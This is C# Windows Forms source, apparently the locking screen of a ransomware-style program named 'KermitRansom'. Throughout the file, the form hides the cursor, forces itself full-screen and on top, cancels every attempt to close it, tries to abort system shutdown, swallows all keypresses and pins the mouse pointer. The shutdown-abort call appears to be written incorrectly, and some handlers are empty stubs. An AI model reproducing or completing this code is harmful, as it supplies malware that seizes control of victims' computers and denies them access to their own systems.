using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.IO;
using System.Threading;
using System.Diagnostics;
using System.Reflection;
using System.Runtime.InteropServices;

namespace KermitRansom
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
            Cursor.Hide();
            TopMost = true;
        }

        [DllImport("user32.dll")]
        static extern void mouse_event(uint dwFlags, int dx, int dy, uint dwData,
        UIntPtr dwExtraInfo);

        private void Form1_Load(object sender, EventArgs e)
        {
           if (this.WindowState != FormWindowState.Maximized)
            {
                this.WindowState = FormWindowState.Maximized;
            } 
        }
        private void StopShutdown(object sender, FormClosingEventArgs e)
        {
            e.Cancel = true;
            if(e.CloseReason == CloseReason.WindowsShutDown)
            {
                Process.Start("shutdown -a");
            }
            else if(e.CloseReason == CloseReason.TaskManagerClosing)
            {

            }
        }

        private void label1_Click(object sender, EventArgs e)
        {

        }

        private void KeyPressAction(object sender, KeyEventArgs e)
        {
            e.SuppressKeyPress = true;
            System.Threading.Thread.Sleep(666);
            Cursor.Position = new System.Drawing.Point(1000,0);
            Cursor.Position = new Point(Cursor.Position.X -0, Cursor.Position.Y -0);
        }
    }
}
